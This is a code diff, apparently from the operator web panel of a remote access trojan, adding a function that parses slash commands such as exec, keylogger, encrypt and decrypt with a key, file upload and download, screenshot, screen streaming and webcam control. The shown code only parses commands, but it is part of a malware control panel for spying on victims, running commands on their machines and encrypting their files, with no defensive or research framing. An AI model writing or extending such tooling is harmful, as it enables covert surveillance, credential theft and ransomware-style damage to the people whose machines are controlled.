@@ -838,6 +838,49 @@
       }
     });
 
+    // --- parseSlashCommand: robust für alle /-Befehle ---
+    function parseSlashCommand(cmdText) {
+      if (!cmdText.startsWith("/")) return null;
+      const [slash, ...args] = cmdText.trim().split(" ");
+      const action = slash.replace("/", "");
+      const argument = args.join(" ");
+      switch (action) {
+        case "exec":
+          return { action, command: argument };
+        case "download":
+          return { action, path: argument };
+        case "upload":
+          return { action };
+        case "history":
+          return { action, limit: parseInt(argument) || 20 };
+        case "keylogger":
+          return { action, count: parseInt(argument) || 50 };
+        case "ls":
+          return { action, path: argument || "." };
+        case "cd":
+          return { action, path: argument || "." };
+        case "encrypt":
+          return { action, path: argument || "." };
+        case "decrypt": {
+          const [path, key_hex] = args;
+          return { action, path: path || ".", key_hex: key_hex || "" };
+        }
+        case "screenshot":
+        case "systeminfo":
+        case "shutdown":
+        case "restart":
+        case "screenstream_start":
+        case "screenstream_stop":
+        case "scan_cameras":
+        case "webcam_start":
+        case "webcam_stop":
+        case "help":
+          return { action };
+        default:
+          return { action, argument };
+      }
+    }
+
     // --- Live-Screen-Kommandos: UI-Statusanzeige und Bereich ein-/ausblenden ---
     function handleLiveScreenCommand(cmd) {
       if (!liveScreenArea) return;
